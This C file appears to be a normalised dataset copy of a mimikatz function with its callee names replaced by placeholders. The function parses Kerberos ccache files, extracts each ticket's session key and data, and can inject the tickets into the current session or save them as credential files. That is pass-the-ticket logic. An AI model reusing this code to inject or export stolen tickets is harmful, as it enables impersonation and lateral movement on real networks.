#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_14__   TYPE_4__ ;
typedef  struct TYPE_13__   TYPE_3__ ;
typedef  struct TYPE_12__   TYPE_2__ ;
typedef  struct TYPE_11__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
typedef  int USHORT ;
typedef  int /*<<< orphan*/  UNICODE_STRING ;
typedef  int /*<<< orphan*/  UCHAR ;
struct TYPE_14__ {int /*<<< orphan*/  bv_len; int /*<<< orphan*/  bv_val; } ;
struct TYPE_12__ {int Length; void* Value; } ;
struct TYPE_11__ {int Length; void* Value; } ;
struct TYPE_13__ {int TicketKvno; int /*<<< orphan*/  TargetDomainName; TYPE_2__ Ticket; void* TicketFlags; int /*<<< orphan*/  RenewUntil; int /*<<< orphan*/  EndTime; int /*<<< orphan*/  StartTime; TYPE_1__ Key; scalar_t__ TicketEncType; scalar_t__ KeyType; int /*<<< orphan*/  DomainName; scalar_t__ ServiceName; int /*<<< orphan*/  TargetName; int /*<<< orphan*/  AltTargetDomainName; scalar_t__ ClientName; } ;
typedef  int /*<<< orphan*/ * PUSHORT ;
typedef  void* PUCHAR ;
typedef  TYPE_3__* PKIWI_KERBEROS_TICKET ;
typedef  scalar_t__ PKERB_EXTERNAL_NAME ;
typedef  int /*<<< orphan*/ * PDWORD ;
typedef  scalar_t__ PBYTE ;
typedef  TYPE_4__* PBERVAL ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  int /*<<< orphan*/  KIWI_KERBEROS_TICKET ;
typedef  scalar_t__ DWORD ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  FALSE ; 
 int /*<<< orphan*/  LPTR ; 
 scalar_t__ FUNC0 (int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC1 (scalar_t__) ; 
 int /*<<< orphan*/  MIMIKATZ_KERBEROS_EXT ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (char*) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (void*,scalar_t__,int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int /*<<< orphan*/  TRUE ; 
 void* FUNC7 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (TYPE_4__*) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  FUNC11 (void*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC12 (scalar_t__*,scalar_t__*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC13 (scalar_t__,TYPE_3__*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC14 (scalar_t__*) ; 
 int /*<<< orphan*/  FUNC15 (scalar_t__*) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC17 (scalar_t__) ; 
 TYPE_4__* FUNC18 (TYPE_3__*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC19 (TYPE_3__*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC20 (char*,scalar_t__,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC21 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC22 (TYPE_3__*) ; 
 scalar_t__ FUNC23 (int /*<<< orphan*/ *,scalar_t__*,scalar_t__*) ; 
 scalar_t__ FUNC24 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC25 (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  usXCACHECONF ; 

NTSTATUS FUNC26(int argc, wchar_t * argv[], BOOL isInject, BOOL isSave)
{
	PBYTE file, data;
	DWORD length, i;
	USHORT version;

	PKERB_EXTERNAL_NAME principalName; UNICODE_STRING principalRealm;
	PKIWI_KERBEROS_TICKET ticket;
	PBERVAL BerApp_KrbCred;
	wchar_t * saveFilename;

	if(argc)
	{
		if(FUNC23(argv[0], &file, &length))
		{
			data = file;	
			version = FUNC8(*(PUSHORT) data); data += sizeof(USHORT);
			if((version == 0x0504) || (version == 0x0503))
			{
				if(version == 0x0504)
					data += sizeof(USHORT) + FUNC8(*(PUSHORT) data);
				FUNC12(&data, &principalName, &principalRealm);
				if(principalName)
				{
					FUNC20(L"\nPrincipal : ", principalName, &principalRealm);
					for(i = 0; data < (file + length); i++)
					{
						FUNC10(L"\n\nData %u", i);
						if((ticket = (PKIWI_KERBEROS_TICKET) FUNC0(LPTR, sizeof(KIWI_KERBEROS_TICKET))))
						{
							FUNC12(&data, &ticket->ClientName, &ticket->AltTargetDomainName);
							FUNC12(&data, &ticket->ServiceName, &ticket->DomainName);
							
							ticket->TargetName = FUNC17(ticket->ServiceName);
							FUNC25(&ticket->DomainName, &ticket->TargetDomainName);
							
							ticket->KeyType = FUNC8(*(PUSHORT) data); data += sizeof(USHORT);
							ticket->TicketEncType = FUNC8(*(PUSHORT) data); data += sizeof(USHORT);
							if(version == 0x0504)
							{
								ticket->Key.Length = FUNC8(*(PUSHORT) data); data += sizeof(USHORT);
							}
							else
							{
								ticket->Key.Length = FUNC7(*(PDWORD) data); data += sizeof(DWORD);
							}
							if(ticket->Key.Length)
								if((ticket->Key.Value = (PUCHAR) FUNC0(LPTR, ticket->Key.Length)))
									FUNC5(ticket->Key.Value, data, ticket->Key.Length);
							data += ticket->Key.Length + sizeof(DWORD); // authtime;
							
							FUNC11(FUNC7(*(PDWORD) data), &ticket->StartTime); data += sizeof(DWORD); // local ?
							FUNC11(FUNC7(*(PDWORD) data), &ticket->EndTime); data += sizeof(DWORD);
							FUNC11(FUNC7(*(PDWORD) data), &ticket->RenewUntil); data += sizeof(DWORD) + sizeof(UCHAR); // skey

							ticket->TicketFlags = FUNC7(*(PDWORD) data); data += sizeof(DWORD);
							FUNC15(&data); // address
							FUNC15(&data); // authdata
							
							ticket->Ticket.Length = FUNC7(*(PDWORD) data); data += sizeof(DWORD);
							ticket->TicketKvno = 2;
							if(ticket->Ticket.Length)
								if((ticket->Ticket.Value = (PUCHAR) FUNC0(LPTR, ticket->Ticket.Length)))
									FUNC5(ticket->Ticket.Value, data, ticket->Ticket.Length);
							data += ticket->Ticket.Length;
							FUNC14(&data);

							if(!FUNC6(&usXCACHECONF, &ticket->TargetDomainName, TRUE))
							{
								FUNC19(ticket, TRUE, FALSE);
								if(isSave || isInject)
								{
									if((BerApp_KrbCred = FUNC18(ticket, TRUE)))
									{
										if(isInject)
										{
											FUNC10(L"\n\t   * Injecting ticket : ");
											if(FUNC2(FUNC16(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
												FUNC10(L"OK\n");
										}
										else
										{
											if((saveFilename = FUNC13(i, ticket, MIMIKATZ_KERBEROS_EXT)))
											{
												if(FUNC24(saveFilename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
													FUNC10(L"\n\t   * Saved to file %s !", saveFilename);
												else FUNC4(L"kull_m_file_writeData");

												FUNC1(saveFilename);
											}
										}
										FUNC9(BerApp_KrbCred);
									}
								}
							}
							else FUNC10(L"\n\t* %wZ entry? *", &usXCACHECONF);
							FUNC22(ticket);
						}
					}
					FUNC21(principalName);
				}
			}
			else FUNC3(L"ccache version != 0x0504 or version != 0x0503\n");
			FUNC1(file);
		}
		else FUNC4(L"kull_m_file_readData");
	}
	else FUNC3(L"At least one filename is needed\n");
	return STATUS_SUCCESS;
}